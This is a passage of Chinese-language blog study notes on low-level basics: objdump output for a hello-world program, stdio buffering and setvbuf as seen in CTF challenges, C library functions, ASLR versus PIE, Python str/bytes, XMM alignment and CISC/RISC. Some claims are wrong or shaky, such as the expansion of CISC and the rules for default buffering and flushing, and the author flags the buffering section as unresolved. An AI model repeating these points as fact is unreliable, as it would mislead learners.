class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -sd hello.o</span><br><span class="line"></span><br><span class="line">hello.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 554889e5 488d3d00 000000e8 00000000  UH..H.=.........</span><br><span class="line"> 0010 b8000000 005dc3                      .....].</span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 68656c6c 6f2c2077 6f726c64 00        hello, world.</span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202847 4e552920 372e322e  .GCC: (GNU) 7.2.</span><br><span class="line"> 0010 3000                                 0.</span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 01781001  .........zR..x..</span><br><span class="line"> 0010 1b0c0708 90010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 17000000 00410e10 8602430d  .........A....C.</span><br><span class="line"> 0030 06520c07 08000000                    .R......</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">   0:   55                      push   %rbp</span><br><span class="line">   1:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">   4:   48 8d 3d 00 00 00 00    lea    0x0(%rip),%rdi        # b &lt;main+0xb&gt;</span><br><span class="line">   b:   e8 00 00 00 00          callq  10 &lt;main+0x10&gt;</span><br><span class="line">  10:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  15:   5d                      pop    %rbp</span><br><span class="line">  16:   c3                      retq</span><br></pre></td></tr></table></figure><p>汇编器将汇编代码转变成机器可以执行的指令。</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d -j .text hello</span><br><span class="line">......</span><br><span class="line">000000000000064a &lt;main&gt;:</span><br><span class="line"> 64a:   55                      push   %rbp</span><br><span class="line"> 64b:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line"> 64e:   48 8d 3d 9f 00 00 00    lea    0x9f(%rip),%rdi        # 6f4 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line"> 655:   e8 d6 fe ff ff          callq  530 &lt;puts@plt&gt;</span><br><span class="line"> 65a:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 65f:   5d                      pop    %rbp</span><br><span class="line"> 660:   c3                      retq</span><br><span class="line"> 661:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line"> 668:   00 00 00</span><br><span class="line"> 66b:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>目标文件需要链接一大堆文件才能得到最终的可执行文件（上面只展示了链接后的 main 函数，可以和 hello.o 中的 main 函数作对比）。链接过程主要包括地址和空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重定向（Relocation）等。</p><h2 id="流与缓冲"><a href="#流与缓冲" class="headerlink" title="流与缓冲"></a>流与缓冲</h2><h3 id="缓冲区是啥"><a href="#缓冲区是啥" class="headerlink" title="缓冲区是啥"></a>缓冲区是啥</h3><p>缓冲区是计算机中用于存储数据的一段内存区域，它可以用于临时存储输入或输出的数据，以提高计算机的性能。<strong>在输入/输出操作中，缓冲区通常用于临时存储待读取或待写入的数据</strong>。</p><p>在标准C库中，对于文件流，缓冲区是由库管理的一个内存区域，用于存储读写数据时的临时数据。<strong>输入缓冲区用于缓存从文件中读取的数据，输出缓冲区用于缓存将要写入文件的数据</strong>。缓冲区的作用是将多个小数据块合并成一个大数据块进行读写，从而提高输入输出效率。</p><p>缓冲区的大小通常是可配置的，并且可以根据实际需求进行调整。较小的缓冲区可以提高输入输出的实时性，但可能会导致读写速度较慢。较大的缓冲区可以提高输入输出的速度，但会消耗更多的内存空间。因此，在实际应用中，需要根据具体场景和需求来选择合适的缓冲区大小。</p><h3 id="输出流与输入流和错误流"><a href="#输出流与输入流和错误流" class="headerlink" title="输出流与输入流和错误流"></a>输出流与输入流和错误流</h3><p><strong>输入流</strong>通常与输入设备相对应，例如键盘、鼠标、触摸屏等。程序可以从输入流中读取数据，以便对数据进行处理和分析。在 C 语言中，标准输入流 stdin 就是一种输入流，程序可以使用各种输入函数（如 scanf() 或 fgets()）从 stdin 中读取数据。</p><p><strong>输出流</strong>通常与输出设备相对应，例如显示器、打印机、文件等。程序可以使用各种输出函数（如 printf() 或 fputs()）将数据输出到输出流中，以便展示给用户或保存到文件中。在 C 语言中，标准输出流 stdout 就是一种输出流，程序可以使用各种输出函数向 stdout 中输出数据。</p><p>除了标准输入流 stdin 和标准输出流 stdout，C 语言还提供了一个<strong>标准错误流 stderr</strong>。与标准输入流和标准输出流类似，标准错误流也是一种数据流，用于向程序开发者或用户报告错误和异常情况。在 C 语言中，标准错误流 stderr 与标准输出流 stdout 类似，也是一种输出流，可以使用各种输出函数将错误信息输出到 stderr 中。与标准输出流不同的是，标准错误流通常不会被缓冲，这意味着当错误信息输出到 stderr 时，它会立即显示在屏幕上或被写入到文件中，以便及时发现和处理错误。</p><h3 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h3><p>setbuf 是一个标准C库函数，用于设置标准I/O库的缓冲区。它的原型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void setbuf(FILE *restrict stream, char *restrict buf);</span><br></pre></td></tr></table></figure><p>其中，stream 是一个指向 FILE 结构体的指针，用于标识要设置缓冲区的流；buf 是一个指向 char 类型的数组，用于指定缓冲区的地址。<strong>如果 buf 是 NULL，那么会禁用缓冲，相当于将流设置为无缓冲模式</strong>。</p><p>setbuf 函数的作用是设置流的缓冲区，以及决定流的缓冲模式（有缓冲或无缓冲）。</p><p>使用 setbuf 函数可以在打开文件之后立即设置流的缓冲区，这比使用 setvbuf 函数要简单，但是 setbuf 函数不支持自定义缓冲区大小和缓冲模式的设置。</p><h3 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h3><p>setvbuf和setbuf类似,但有些许差异</p><p>setvbuf 函数原型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int setvbuf(FILE *stream, char *buffer, int mode, size_t size);</span><br></pre></td></tr></table></figure><ol><li><code>stream</code>：一个指向文件流的指针，它指定要设置缓冲区的文件。</li><li><code>buffer</code>：一个指向缓冲区的指针，用于指定自定义缓冲区。如果设置为 <code>NULL</code>，<strong>则 <code>setvbuf</code> 将为文件流分配一个默认缓冲区。</strong></li><li><code>mode</code>：一个整数，指定缓冲区的类型。可以采用以下三个预定义常量之一：<ul><li><code>_IOFBF</code>：完全缓冲（full buffering）模式，文件的读写操作都在缓冲区中进行。数据在缓冲区填满或者使用 <code>fflush</code> 函数刷新缓冲区时才进行实际的读写操作。<strong>值等于0</strong></li><li><code>_IOLBF</code>：行缓冲（line buffering）模式，每次写入缓冲区的数据是以换行符 <code>\n</code> 结尾的，或者缓冲区已满时会自动刷新缓冲区。在读取时，数据也是以行为单位从缓冲区读取。<strong>值等于1</strong></li><li><code>_IONBF</code>：无缓冲（unbuffered）模式，数据立即写入文件或从文件读取，没有缓冲区。<strong>值等于2</strong></li></ul></li><li><code>size</code>：一个 <code>size_t</code> 类型的值，指定缓冲区的大小（仅在自定义缓冲区时有效）。如果 <code>buffer</code> 参数为 <code>NULL</code>，则此参数指定默认缓冲区的大小</li></ol><h3 id="缓冲区刷新"><a href="#缓冲区刷新" class="headerlink" title="缓冲区刷新"></a>缓冲区刷新</h3><p>当缓冲区满时(或行缓冲遇到\n)，<strong>会触发缓冲区刷新操作</strong>，<strong>即将缓冲区内的数据发送到相应的文件或设备中(写入或输出)</strong>。具体来说，缓冲区满的情况下有两种触发缓冲区刷新的方式：</p><ol><li>缓冲区填满(或行缓冲遇到\n)：当缓冲区已满并且程序试图向其写入更多数据时，会自动触发缓冲区刷新操作，将缓冲区内的数据发送到相应的文件或设备中，以便为新的数据腾出空间。(如果换行符后面还有字符则可能会出现一些奇怪的行为)</li><li>强制刷新：程序可以通过调用 fflush 函数强制刷新缓冲区，即将缓冲区内的数据立即发送到相应的文件或设备中，而不必等待缓冲区填满。</li></ol><p>需要注意的是，<strong><u>在默认情况下</u></strong>，缓冲区在以下情况下会自动刷新：</p><ol><li><strong>当程序正常退出时。</strong></li><li><u><strong>当程序调用 exit 函数时。</strong></u></li><li><strong>在输出流（例如标准输出流<code>stdout</code>或标准错误流<code>stderr</code>）中，当缓冲区被填满，或者调用<code>printf()</code>、<code>puts()</code>等输出函数时，会自动刷新缓冲区。</strong></li><li><strong>程序调用了某些输入函数（例如fgets、fscanf、gets、getchar、scanf）来读取缓冲区中的数据，此时缓冲区中的数据将被强制刷新到程序中进行处理。</strong>(如果输入缓冲区中有数据，就会从输入缓冲区中读取数据并进行处理，如果输入缓冲区中没有数据，则会等待用户输入，直到用户输入完毕。当这些函数被调用时，<strong><u>如果输入缓冲区中的数据长度超过了函数所期望的长度，多余的数据将会被保留在输入缓冲区中</u></strong>，等待下一次输入函数调用时被处理。)</li></ol><h3 id="常见形式与功能"><a href="#常见形式与功能" class="headerlink" title="常见形式与功能"></a>常见形式与功能</h3><p>经常能在做题时看见</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li><code>setvbuf(stdout, 0, 2, 0);</code> 表示将标准输出流 stdout 设置为无缓冲模式，并且缓冲区大小为默认大小。</li><li><code>setvbuf(stdin, 0, 1, 0);</code> 表示将标准输入流 stdin 设置为行缓冲模式，并且缓冲区大小为默认大小。</li><li><code>setvbuf(stderr, 0, 1, 0);</code> 表示将标准错误流 stderr 设置为行缓冲模式，并且缓冲区大小为默认大小。</li></ul><p>或者</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>)</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>)</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>setbuf函数被用来禁用了标准输入、标准输出和标准错误流的缓冲区，将其设置为无缓冲模式。</p><p>在无缓冲模式下，每次从流中读取或写入的数据都会直接传输到底层设备，而不会先缓存在流的缓冲区中。文件与设备是直接交互的，中间没有缓冲区(存在但未使用)。</p><h3 id="若无setbuf与setvbuf"><a href="#若无setbuf与setvbuf" class="headerlink" title="若无setbuf与setvbuf"></a>若无setbuf与setvbuf</h3><p>在标准C中，<strong><u><em>默认情况下</em></u></strong>，<strong>标准错误流是不缓冲的</strong>，也就是说，每次读取或写入<u>一个字符</u>时都会立即与底层设备进行交互。而<strong>标准输入和标准输出流默认是<u>行缓冲</u>的</strong>，也就是说，每当输出一个<u>换行符</u>或者缓冲区被<u>填满</u>时，才会将缓冲区中的数据输出到屏幕上。</p><p>这也就是为什么一些题目,按照源码明明该有输出,但管道却阻塞无输出的原因</p><p><strong><u>此外若程序在无setbuf与setvbuf的情况下,要想获得其最终结果输出就需要使得程序正常退出(exit())</u></strong></p><p>因为此时输出结果<u>是先缓存在服务器本地的</u>。</p><p>另外，程序<u>本身没有setbuf操作的话</u>，<strong>在第一次执行io操作时会在堆中申请缓冲区(1024?)</strong>。</p><p>上面所述有一些问题，具体与编译器版本有一定关系</p><h3 id="待修！！"><a href="#待修！！" class="headerlink" title="待修！！"></a>待修！！</h3><p>关于这一块内容，还有很多疑惑，调试学习反而越调试疑惑越多了😈！！</p><p>暂时也找不到渠道进行更精确的学习了，就这样吧<br><strong>总之做题过程中，要<u>特别注意传递的数据的长度与程序处理的数据长度对应，特别是换行符的问题</u>！！！</strong></p><p><u>还有相连的输入函数处理问题</u></p><p><strong>还有低级io函数如read、write，与其他标准输入输出函数又有些许不同(<u>例如read似乎并不完全遵守有缓冲模式的规则</u>),需要注意具体分析。</strong></p><h2 id="linux程序执行流程"><a href="#linux程序执行流程" class="headerlink" title="linux程序执行流程"></a>linux程序执行流程</h2><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/hZ3KjroJWDPQBcl.png" alt=""></p><h2 id="常见c库函数"><a href="#常见c库函数" class="headerlink" title="常见c库函数"></a>常见c库函数</h2><p>一些用的不多的c库函数,有些陌生,归纳记录一下</p><h3 id="fgets"><a href="#fgets" class="headerlink" title="fgets"></a>fgets</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">int</span> n, FILE *<span class="keyword">restrict</span> stream)</span>`;</span><br></pre></td></tr></table></figure><p>从流stream中读取n个字符并写入s字符串中</p><h3 id="isoc99-sscanf"><a href="#isoc99-sscanf" class="headerlink" title="__isoc99_sscanf"></a>__isoc99_sscanf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __isoc99_sscanf(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...);</span><br></pre></td></tr></table></figure><p>从字符串s中按格式化字符串format写到指定位置</p><h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>其中，参数含义如下：</p><ul><li><code>ptr</code>：指向读取数据存储位置的指针；</li><li><code>size</code>：每个数据块的字节数；</li><li><code>count</code>：数据块的个数；</li><li><code>stream</code>：文件指针，指向要读取的文件。</li><li>函数返回值为实际读取的数据块数目，如果发生错误或者已经到达文件结尾，则返回值可能小于 <code>count</code>。</li></ul><h3 id="strtol"><a href="#strtol" class="headerlink" title="strtol"></a>strtol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *nptr, <span class="type">char</span> **endptr, <span class="type">int</span> base)</span></span><br></pre></td></tr></table></figure><p>其中，参数含义如下：</p><ul><li><code>nptr</code>：要转换的字符串指针；</li><li><code>endptr</code>：可选输出参数，指向转换停止处的下一个字符的指针，如果该指针为 NULL，则不会返回该值；</li><li><code>base</code>：进制数，可以是 2 ~ 36 之间的任意值，或者特殊值 0，表示根据 <code>nptr</code> 的前缀来确定进制数（”0x” 或 “0X” 表示 16 进制，”0” 表示 8 进制，否则默认为 10 进制）。</li></ul><p>函数返回值为转换后的长整型数值。如果转换失败，返回值为 0，同时设置 <code>endptr</code> 为 <code>nptr</code>，并将 <code>errno</code> 设置为 <code>EINVAL</code> 或 <code>ERANGE</code>。</p><p>需要注意的是，由于 <code>strtol</code> 函数不支持无符号长整型，因此如果需要将字符串转换为无符号长整型，可以使用 <code>strtoul</code> 函数。</p><p>且strtol只能转换数字组成的字符串</p><h3 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h3><h2 id="ASLR与PIE"><a href="#ASLR与PIE" class="headerlink" title="ASLR与PIE"></a>ASLR与PIE</h2><p>总是混淆分不清,整理一下</p><div class="table-container"><table><thead><tr><th></th><th>作用位置</th><th>归属</th><th>作用时间</th></tr></thead><tbody><tr><td>ASLR</td><td>0:不开启<br/>1：栈基地址（stack）、共享库（.so\libraries）、mmap 基地址<br/>2：在 1 基础上，增加随机化堆基地址（chunk）</td><td>系统功能</td><td>作用于程序（ELF）装入内存运行时</td></tr><tr><td>PIE</td><td>代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）</td><td>编译器功能</td><td>作用于程序（ELF）编译过程中</td></tr></tbody></table></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改ASLR设置</span><br><span class="line">echo 0/1/2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><h2 id="python3-str-amp-amp-bytes"><a href="#python3-str-amp-amp-bytes" class="headerlink" title="python3-str&amp;&amp;bytes"></a>python3-str&amp;&amp;bytes</h2><p>在Python 3中,有两种类型的文本数据字符串(str)和字节串(bytes).</p><h3 id="异同"><a href="#异同" class="headerlink" title="异同"></a>异同</h3><p>二者最大的差异在于编码方式:</p><ol><li>字符串是Unicode字符序列，使用UTF-8等编码方式存储。</li><li>字节串是二进制数据序列，它们是字节的序列，采用ASCII编码,每个字节的值在0-255之间。</li></ol><p>此外还有许多细节差异</p><ol><li>可变性： 字符串是不可变的，这意味着一旦创建，就不能修改它们的内容。字节串也是不可变的，但它们可以被替换成一个新的字节串。</li><li>用途： 字符串通常用于文本处理，如字符串的搜索、替换、拼接等。字节串通常用于二进制数据处理，如图像、声音、视频等数据的读写和处理。</li><li>操作符的区别： 在字符串中，“+”运算符表示字符串的连接，而在字节串中，“+”运算符表示字节串的拼接。在字符串中，“<em>”运算符表示重复一个字符串，而在字节串中，“\</em>”运算符表示重复一个字节串。</li><li>方法的区别： 字符串和字节串具有许多相同的方法，但在实现上有所不同。例如，在字符串中，str.split()方法返回一个字符串列表，而在字节串中，bytes.split()方法返回一个字节串列表。</li></ol><h3 id="表示"><a href="#表示" class="headerlink" title="表示"></a>表示</h3><ol><li>str:字符串使用单引号、双引号或三重引号来表示。</li><li>bytes:字节串则使用<strong>前缀“b”</strong>来表示，后跟一对单引号、双引号或三重引号。</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string1 = <span class="string">&#x27;Hello, world!&#x27;</span></span><br><span class="line">bytes1 = <span class="string">b&#x27;Hello, world!&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="变量插入"><a href="#变量插入" class="headerlink" title="变量插入"></a>变量插入</h3><p>{}留空,逐个对应format中的变量</p><p>在str中插入变量</p><p><code>str=&#39;abc&#123;&#125;&#39;.format()&#39;</code></p><p>在bytes中插入变量</p><p><code>bytes=bytes(&#39;abc&#123;&#125;&#39;.format(),&#39;utf-8&#39;)</code></p><p>bytes插入变量需要<strong>指定解码方式</strong></p><h2 id="XMM寄存器"><a href="#XMM寄存器" class="headerlink" title="XMM寄存器"></a>XMM寄存器</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>现代处理器还有一些扩展,这些扩展体现在电路上，指令集上，有时候也会扩展一些很有用的寄存器。</p><p>比较著名的扩展叫作 SSE (Streaming SIMD Extensions)，该扩展加入了新的 xmm 寄存器集合：</p><p><strong>xmm0，xmm1，…，xmm15</strong>。共16个寄存器,这些寄存器固定为 <strong>128 位宽</strong>，常用于两种任务：</p><ul><li>浮点数运算；</li><li>SIMD 指令集(这种指令一条指令可以操作多条数据)</li></ul><p>每个XMM寄存器都可以存储128位（16字节）的数据，并且可以用于执行一次性并行处理多个数据的操作，如浮点运算、图像处理和向量运算等。这使得XMM寄存器在执行高性能计算和多媒体应用程序时非常有用。</p><h3 id="内存对齐问题"><a href="#内存对齐问题" class="headerlink" title="内存对齐问题"></a>内存对齐问题</h3><p>先看操作xmm寄存器的四个指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">movaps和movups之间的区别在于对内存对齐的要求。movaps要求数据在内存中按照128位对齐，而movups可以处理未对齐的数据。</span><br><span class="line"></span><br><span class="line">movups：将128位数据从一个XMM寄存器或内存位置复制到另一个XMM寄存器或内存位置。与movaps不同，movups不要求数据在内存中按照128位对齐。</span><br><span class="line"></span><br><span class="line">movdqa：将128位数据从一个XMM寄存器或内存位置复制到另一个XMM寄存器或内存位置。与movaps类似，movdqa要求数据在内存中按照128位对齐。</span><br><span class="line"></span><br><span class="line">movdqu：类似于movups，它将128位数据从一个XMM寄存器或内存位置复制到另一个XMM寄存器或内存位置，但是对内存对齐没有特殊要求。它可以处理未对齐的数据，并且在某些情况下，可能会导致性能下降。</span><br></pre></td></tr></table></figure><p><strong>结论:movaps和movdqa要求内存对齐,而movups和movdqu不要求</strong></p><p>大多数 SSE 指令都需要内存操作数适当地进行对齐。上面说到的未对齐版本的指令和对齐版本的指令在助记符上就有差别，而且因为内存未对齐的关系，性能也会受影响。由于 SSE 指令经常被用在性能敏感的场合，所以始终使用操作数内存对齐版本的指令是明智之举。</p><h2 id="CISC和RISC"><a href="#CISC和RISC" class="headerlink" title="CISC和RISC"></a>CISC和RISC</h2><p>处理器有一种按照其指令集进行分类的方式。当设计一个处理器时有两个极端。</p><ul><li>设计出各种特化指令，高级指令。这种架构叫作 <strong>CISC (Complete Instruction Set Computer)</strong> 架构。</li><li>只使用一些基本指令，完成的架构叫 <strong>RISC (Reduced Instruction Set Computer)</strong> 架构。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">指令集复杂：CISC架构的指令集包含大量的复杂指令，可以执行更高级的操作，如内存访问、字符串处理、浮点运算等。这些指令通常具有多个操作数和复杂的寻址模式。</span><br><span class="line">指令多样性：CISC架构的指令集包含各种不同的指令，每个指令可以执行多个操作，甚至一个指令可以完成一系列操作。这使得编程更灵活，但也增加了硬件的复杂性。</span><br><span class="line">存储器访问：CISC架构通常允许直接访问内存，即指令可以直接操作内存中的数据，而不需要将数据加载到寄存器中。</span><br><span class="line">指令长度不统一：CISC指令长度可以不同，从几个字节到几十个字节不等，这使得指令解码复杂。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">简化指令集：RISC架构的指令集相对简化，指令数量较少且固定，每个指令执行的操作也更加简单和基本，如算术运算、逻辑运算等。</span><br><span class="line">指令统一性：RISC架构的指令长度一般是固定的，通常为两个字（32位）或一个字（16位），这简化了指令解码和处理器设计。</span><br><span class="line">寄存器优先：RISC架构鼓励使用寄存器操作，大多数操作都在寄存器上进行，减少了对内存的直接访问。</span><br><span class="line">流水线执行：RISC架构更注重流水线执行，指令之间的依赖关系较少，可以并行执行，提高了处理器的性能。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">一些十分基础的东西</summary>
    
    
    
    <category term="杂烩" scheme="https://ixout.github.io/categories/%E6%9D%82%E7%83%A9/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="基础" scheme="https://ixout.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
</feed>
